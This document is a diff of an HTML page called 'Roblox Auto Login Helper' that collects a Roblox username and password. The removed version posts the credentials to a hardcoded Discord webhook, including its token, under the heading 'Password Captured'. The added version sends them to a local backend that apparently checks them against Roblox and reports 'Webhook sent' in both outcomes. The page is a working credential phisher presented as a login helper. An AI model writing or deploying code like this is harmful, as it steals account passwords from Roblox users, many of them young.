@@ -1,13 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
 <title>Roblox Auto Login Helper</title>
 <style>
-body { font-family: Arial; background: #121212; color: #eee; display:flex; flex-direction: column; align-items:center; justify-content:center; height:100vh;}
-input { padding: 10px; margin:5px; width:250px; border-radius:5px; border:none;}
-button { padding:10px 20px; margin:10px; border-radius:5px; border:none; background:#1a73e8; color:#fff; cursor:pointer;}
-#status { margin-top:10px; font-size:16px;}
+body { font-family: Arial; text-align:center; margin-top:50px;}
+input { padding:10px; margin:5px; width:250px;}
+button { padding:10px 20px; margin:5px;}
+#status { margin-top:15px; font-weight:bold; }
 </style>
 </head>
 <body>
@@ -15,47 +15,44 @@ button { padding:10px 20px; margin:10px; border-radius:5px; border:none; backgro
 
 <input id="username" placeholder="Username / Email">
 <input id="password" type="password" placeholder="Password">
-<button id="sendBtn">Send to Webhook</button>
-<button id="loginBtn">Open Roblox Login Page</button>
+<br>
+<button id="loginBtn">Verify Login & Send Webhook</button>
 
-<p id="status">Enter credentials and click a button</p>
+<p id="status"></p>
 
 <script>
-const webhookURL = "https://discord.com/api/webhooks/1393508497299345448/KdIyKVOnH1HY7sNXot68neET1pVVzVD4AC9EfQrv3W5sxhsPW2WC2ouO5eOfaQBq-eSM";
+document.getElementById("loginBtn").addEventListener("click", () => {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value;
+    const statusEl = document.getElementById("status");
 
-const usernameInput = document.getElementById("username");
-const passwordInput = document.getElementById("password");
-const statusEl = document.getElementById("status");
-
-function sendWebhook(username, password) {
-    fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            username: "Roblox Login Logger",
-            content: `🔐 **Password Captured**\n👤 User: ${username}\n🔑 Password: ${password}\n🌍 Status: Pending manual login`
-        })
-    })
-    .then(() => statusEl.textContent = "✅ Credentials sent to webhook! Open Roblox to login.")
-    .catch(() => statusEl.textContent = "❌ Failed to send to webhook!");
-}
-
-document.getElementById("sendBtn").addEventListener("click", () => {
-    const username = usernameInput.value.trim();
-    const password = passwordInput.value;
     if(!username || !password){
         statusEl.textContent = "❌ Enter both username and password!";
         return;
     }
-    sendWebhook(username, password);
-});
 
-document.getElementById("loginBtn").addEventListener("click", () => {
-    window.open("https://www.roblox.com/login", "_blank");
-    statusEl.textContent = "➡️ Roblox login page opened. Paste credentials manually.";
+    statusEl.textContent = "⏳ Attempting login...";
+
+    fetch("http://127.0.0.1:6969/verify", {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({username, password})
+    })
+    .then(res => res.json())
+    .then(data => {
+        if(data.login === "success"){
+            statusEl.textContent = "✅ Login Successful! Webhook sent.";
+        } else {
+            statusEl.textContent = "❌ Login Failed! Webhook sent.";
+        }
+    })
+    .catch(() => {
+        statusEl.textContent = "❌ Failed to reach backend!";
+    });
 });
 </script>
 </body>
 </html>
+
 
 
